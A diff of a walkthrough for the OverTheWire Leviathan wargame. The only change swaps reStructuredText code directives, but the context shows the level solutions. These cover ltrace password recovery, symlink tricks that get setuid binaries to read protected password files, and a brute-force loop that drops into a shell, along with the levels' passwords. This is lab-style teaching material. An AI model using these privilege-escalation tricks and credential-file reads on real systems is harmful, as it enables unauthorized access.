@@ -19,7 +19,7 @@ Level 0 -> 1 #
 Logging in with :code:`leviathan0:leviathan0` we take a quick look around to see
 what we have to work with, if anything
 
-.. code-block:: console
+.. code:: console
 
 	leviathan0@melinda:~$ ls -la
 	total 24
@@ -32,7 +32,7 @@ what we have to work with, if anything
 
 Let's take a look in that :code:`.backup` folder.
 
-.. code-block:: console
+.. code:: console
 
 	leviathan0@melinda:~$ ls .backup/
 	bookmarks.html
@@ -41,7 +41,7 @@ Checking the contents of the file, we see it really is a list of bookmarks.
 Going on the assumption that the password for the next level is in there, let's
 grep for *leviathan* in this file
 
-.. code-block:: console
+.. code:: console
 
 	leviathan0@melinda:~$ grep leviathan .backup/bookmarks.html 
 	<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
@@ -54,7 +54,7 @@ Level 1 -> 2 #
 As usual we login, do a :code:`ls -la` and see a :code:`check` binary that is setuid :code:`leviathan2`.
 Let's run it and see what happens
 
-.. code-block:: console
+.. code:: console
 
 	leviathan1@melinda:~$ ./check 
 	password: test
@@ -64,7 +64,7 @@ Trying the usual :code:`strings check` shows us a couple of interesting strings:
 Neither one or both will return success. Hrmm. Ok, let's take a look at the 
 disassembly
 
-.. code-block:: console
+.. code:: console
 
 	(gdb) disass main
 	Dump of assembler code for function main:
@@ -115,7 +115,7 @@ disassembly
 So it uses :code:`strcmp` to compare our input to whatever the right pass is (:code:`0x080485ae`)
 I'm going to use :code:`ltrace` to trace through the library call and see what that reveals
 
-.. code-block:: console
+.. code:: console
 
 	leviathan1@melinda:~$ ltrace ./check 
 	__libc_start_main(0x804852d, 1, 0xffffd794, 0x80485f0 <unfinished ...>
@@ -131,7 +131,7 @@ I'm going to use :code:`ltrace` to trace through the library call and see what t
 
 And there we have it. 
 
-.. code-block:: console
+.. code:: console
 
 	leviathan1@melinda:~$ ./check 
 	password: sex
@@ -149,7 +149,7 @@ file. Nope, there's a check in the binary preventing us from doing so.
 
 Let's find out what that check is with :code:`ltrace` once again
 
-.. code-block:: console
+.. code:: console
 
 	leviathan2@melinda:~$ ltrace ./printfile /tmp/unlogic
 	__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 <unfinished ...>
@@ -168,7 +168,7 @@ the :code:`leviathan3` password file, along with another file, that has the same
 by a space and another name, we can trick :code:`access` into allowing it to carry on, and
 then :code:`cat` to print the files. let me show you
 
-.. code-block:: console
+.. code:: console
 
 	leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/levpass3
 	leviathan2@melinda:~$ touch /tmp/levpass3\ other
@@ -186,7 +186,7 @@ Another program that prompts for a pass. Usual approaches of :code:`strings` and
 the *disass* doesn't reveal much, but the function :code:`do_stuff` does call :code:`strcmp`
 and we know now that we can use :code:`ltrace` to help us out
 
-.. code-block:: console
+.. code:: console
 
 	leviathan3@melinda:~$ ltrace ./level3 
 	__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 <unfinished ...>
@@ -202,7 +202,7 @@ and we know now that we can use :code:`ltrace` to help us out
 A little bit of obfuscation here, but to our keen eyes, we see where the test
 is happening :code:`strcmp("d\n", "snlprintf\n")`. Our password is :code:`snlprintf`.
 
-.. code-block:: console
+.. code:: console
 
 	leviathan3@melinda:~$ ./level3 
 	Enter the password> snlprintf  
@@ -218,7 +218,7 @@ Level 4 -> 5 #
 Inside the hidden directory (you always run :code:`ls -la`, right?) we have a bin file.
 It's executable, so let's run it
 
-.. code-block:: console
+.. code:: console
 
 	leviathan4@melinda:~$ ./.trash/bin 
 	01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
@@ -234,7 +234,7 @@ we get a message that file :code:`tmp/file.log` cannot be found. If you create o
 will open it, print its contents, close it, and then delete it. So let's give the 
 old symlink method a try:
 
-.. code-block:: console
+.. code:: console
 
 	leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
 	leviathan5@melinda:~$ ./leviathan5 
@@ -249,7 +249,7 @@ We need a 4 digit pass code to access this. I opted for brute force. For 4 digit
 that's by far the simplest and quickest way. After looking at the disassembly, we
 see that it will call :code:`/bin/sh` and drop us to a shell, so we don't need an exit condition.
 
-.. code-block:: console
+.. code:: console
 
 	leviathan6@melinda:~$ for i in $(seq -f "%04g" 0 9999); do echo $i && ./leviathan6 $i > /dev/null; done
 	0000
@@ -261,7 +261,7 @@ see that it will call :code:`/bin/sh` and drop us to a shell, so we don't need a
 It stops there. Because we redirect to /dev/null, we need to ctrl+c and then enter
 the last printed number to get the password
 
-.. code-block:: console
+.. code:: console
 
 	leviathan6@melinda:~$ ./leviathan6  7123
 	$ cat /etc/leviathan_pass/leviathan7
